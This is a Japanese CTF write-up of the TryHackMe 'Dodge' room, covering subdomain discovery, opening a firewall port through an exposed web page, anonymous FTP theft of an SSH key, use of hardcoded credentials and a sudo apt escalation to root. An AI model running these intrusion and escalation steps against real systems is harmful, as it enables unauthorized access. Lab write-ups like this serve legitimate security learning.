# Dodge CTF

https://tryhackme.com/room/dodge

## Enumeration

```shell
TARGET=10.49.146.85
sudo bash -c "echo $TARGET   dodge.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET  --min-rate 10000

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 64
80/tcp  open  http    syn-ack ttl 64
443/tcp open  https   syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,443 $TARGET

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
443/tcp open  ssl/http Apache httpd 2.4.41
```

SSH, HTTP, HTTPS

HTTPSの証明書を見ると、サブドメインが出ていた。

```
DNS Name: dodge.thm
DNS Name: www.dodge.thm
DNS Name: blog.dodge.thm
DNS Name: dev.dodge.thm
DNS Name: touch-me-not.dodge.thm
DNS Name: netops-dev.dodge.thm
DNS Name: ball.dodge.thm
```

hostsに追加。

```
dodge.thm www.dodge.thm blog.dodge.thm dev.dodge.thm touch-me-not.dodge.thm netops-dev.dodge.thm ball.dodge.thm
```

アクセスできたのは、www, dev, netops-dev のみ。他は403。

## netops-dev

### firewall.js

https://netops-dev.dodge.thm/firewall.js のコードから、firewall10110.php を発見。

アクセスしたらUFWの設定が表示された。

### firewall10110.php

21ポートがDENYになっていることが分かる。

```
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), deny (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
80                         ALLOW IN    Anywhere                  
443                        ALLOW IN    Anywhere                  
22                         ALLOW IN    Anywhere                  
21                         DENY IN     Anywhere                  
21/tcp                     DENY IN     Anywhere                  
80 (v6)                    ALLOW IN    Anywhere (v6)             
443 (v6)                   ALLOW IN    Anywhere (v6)             
22 (v6)                    ALLOW IN    Anywhere (v6)             
21 (v6)                    DENY IN     Anywhere (v6)             
21/tcp (v6)                DENY IN     Anywhere (v6)   
```

FTPポートを許可する。

```
sudo ufw allow 21
```

データ用接続がデフォルトでDENYされるので、FTPのpassiveモードをOFFにする必要がある。

```sh
$ ftp $TARGET
Connected to 10.49.146.85.
220 Welcome to Dodge FTP service
Name (10.49.146.85:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls -al
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 .
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
-rwxr-xr-x    1 1003     1003           87 Jun 29  2023 .bash_history
-rwxr-xr-x    1 1003     1003          220 Feb 25  2020 .bash_logout
-rwxr-xr-x    1 1003     1003         3771 Feb 25  2020 .bashrc
drwxr-xr-x    2 1003     1003         4096 Jun 19  2023 .cache
drwxr-xr-x    3 1003     1003         4096 Jun 19  2023 .local
-rwxr-xr-x    1 1003     1003          807 Feb 25  2020 .profile
drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .ssh
-r--------    1 1003     1003           38 Jun 19  2023 user.txt
226 Directory send OK.
```

.ssh の id_rsa_backup をダウンロードでき、それを使ってSSH接続できた。  
ユーザー名は、authorized_keys を見たらわかった。

## 権限昇格１

ユーザーフラグ入手。

```sh
challenger@thm-lamp:~$ ls -al
total 40
drwxr-xr-x 5 challenger challenger 4096 Jun 29  2023 .
drwxr-xr-x 6 root       root       4096 Jun 19  2023 ..
-rwxr-xr-x 1 challenger challenger   87 Jun 29  2023 .bash_history
-rwxr-xr-x 1 challenger challenger  220 Feb 25  2020 .bash_logout
-rwxr-xr-x 1 challenger challenger 3771 Feb 25  2020 .bashrc
drwxr-xr-x 2 challenger challenger 4096 Jun 19  2023 .cache
drwxr-xr-x 3 challenger challenger 4096 Jun 19  2023 .local
-rwxr-xr-x 1 challenger challenger  807 Feb 25  2020 .profile
drwxr-xr-x 2 challenger challenger 4096 Jun 22  2023 .ssh
-r-------- 1 challenger challenger   38 Jun 19  2023 user.txt

challenger@thm-lamp:~$ cat user.txt
THM{[REDACTED]}
```

10000, 37421 ポートをローカルでリッスンしている。

```sh
challenger@thm-lamp:~$ ss -nltp
State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port       Process       
LISTEN       0            4096                   127.0.0.1:37421                  0.0.0.0:*                        
LISTEN       0            511                    127.0.0.1:10000                  0.0.0.0:*                        
LISTEN       0            4096               127.0.0.53%lo:53                     0.0.0.0:*                        
LISTEN       0            128                      0.0.0.0:22                     0.0.0.0:*                        
LISTEN       0            511                            *:80                           *:*                        
LISTEN       0            32                             *:21                           *:*                        
LISTEN       0            128                         [::]:22                        [::]:*                        
LISTEN       0            511                            *:443                          *:* 
```

10000ポートをトンネリングすると、HTTPページが表示された。

```sh
$ ssh -L 10000:localhost:10000 challenger@10.49.146.85 -i ./id_rsa_backup
```

/var/www/notes のソースに対応していると思われる。

ログイン情報がハードコーディングされていた。

```sh
challenger@thm-lamp:/var/www/notes/api$ cat login.php
<?php
session_start();
require 'config.php';
header('Content-Type: application/json');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    $username = $data['username'];
    $password = $data['password'];

    if($username === "gabriela" && $password === "[REDACTED]"){ 
```

ログインしてダッシュボードを見たら、cobra の SSH認証情報が書かれていた。

```sh
My SSH login
cobra / [REDACTED]
```

SSH接続はできなかったが、suコマンドでユーザー変更できた。

## 権限昇格２

```sh
cobra@thm-lamp:~$ sudo -l
Matching Defaults entries for cobra on thm-lamp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobra may run the following commands on thm-lamp:
    (ALL) NOPASSWD: /usr/bin/apt
```

[3種類あるうち](https://gtfobins.github.io/gtfobins/apt/#sudo)の1つで昇格成功した。

```sh
cobra@thm-lamp:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- ufw のコマンド入力で何をどう入れればよいのか分からず戸惑ったが、そこだけわかれば後は一本道だった。

## Tags

#tags:ufw
